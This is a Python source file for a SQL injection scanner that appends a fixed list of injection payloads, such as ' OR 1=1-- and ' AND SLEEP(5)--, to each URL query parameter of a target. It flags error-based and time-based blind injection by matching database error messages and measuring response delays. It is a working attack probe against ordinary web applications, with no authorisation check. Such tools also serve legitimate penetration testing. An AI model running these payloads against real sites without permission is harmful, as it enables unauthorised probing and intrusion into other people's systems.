# sqli_scanner.py
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style

HEADERS = {
    "User-Agent": "Mozilla/5.0 (FullVulnScanner)"
}

ERROR_PATTERNS = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "ORA-01756",
    "SQL syntax error",
    "mysql_fetch",
    "PG::SyntaxError"
]

def load_payloads():
    return [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "' AND SLEEP(5)--",
        "\" AND SLEEP(5)--",
        "' OR 1=1--",
        "'/**/OR/**/1=1--",
        "' OR '1'='1' --",
        "' OR 1=1#",
        "'||(SELECT 1)--"

    ]

def is_error_based(response_text):
    return any(error.lower() in response_text.lower() for error in ERROR_PATTERNS)

def is_time_delayed(url, timeout=7):
    try:
        start = time.time()
        requests.get(url, headers=HEADERS, timeout=timeout)
        duration = time.time() - start
        return duration >= 5  # True if delay >= 5 seconds
    except requests.exceptions.ReadTimeout:
        return True
    except Exception:
        return False

def scan_url(url):
    payloads = load_payloads()
    parsed_url = urlparse(url)
    original_params = parse_qs(parsed_url.query)
    findings = []

    for param in original_params:
        for payload in payloads:
            test_params = original_params.copy()
            test_params[param] = [original_params[param][0] + payload]
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed_url._replace(query=new_query))

            try:
                res = requests.get(test_url, headers=HEADERS, timeout=7)

                if is_error_based(res.text):
                    print(f"{Fore.RED}[!] SQLi Detected (Error-Based): {test_url} via '{payload}'{Style.RESET_ALL}")
                    findings.append({
                        "url": url,
                        "param": param,
                        "type": "Error-Based SQLi",
                        "payload": payload
                    })
                    break

                elif "SLEEP" in payload and is_time_delayed(test_url):
                    print(f"{Fore.MAGENTA}[!!] SQLi Detected (Blind - Time Based): {test_url} via '{payload}'{Style.RESET_ALL}")
                    findings.append({
                        "url": url,
                        "param": param,
                        "type": "Blind SQLi (Time-Based)",
                        "payload": payload
                    })
                    break

                else:
                    print(f"{Fore.GREEN}[-] Tested {param} with payload: {payload}{Style.RESET_ALL}")

            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error testing {test_url}: {e}{Style.RESET_ALL}")
    return findings
